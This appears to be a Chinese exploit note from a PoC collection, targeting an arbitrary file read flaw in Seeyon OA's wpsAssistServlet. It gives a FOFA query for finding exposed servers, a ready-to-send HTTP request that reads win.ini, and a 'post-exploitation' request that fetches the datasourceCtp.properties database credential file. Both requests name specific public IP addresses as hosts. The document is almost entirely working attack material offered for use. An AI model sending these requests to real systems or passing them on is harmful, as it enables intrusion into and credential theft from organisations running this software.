# 致远互联-OA wpsAssistServlet 文件 templateUrl 参数任意文件读取漏洞

    ## fofa

```
body="/seeyon/USER-DATA/IMAGES/LOGIN/login.gif" || title="用友致远A" || (body="/yyoa/" && body!="本站内容均采集于") || header="path=/yyoa" || server=="SY8044" || (body="A6-V5企业版" && body="seeyon" && body="seeyonProductId") || (body="/seeyon/common/" && body="var _ctxpath = '/seeyon'") || (body="A8-V5企业版" && body="/seeyon/") || banner="Server: SY8044"
```

## poc

```
POST /seeyon/wpsAssistServlet HTTP/1.1
Host: 101.78.10.115:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 56

flag=template&templateUrl=C%253A%252Fwindows%252Fwin.ini
```



## 后利用

```
POST /seeyon/wpsAssistServlet HTTP/1.1
Host: 124.71.228.217:8088
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 71

flag=template&templateUrl=/Seeyon/A8/base/conf/datasourceCtp.properties
```
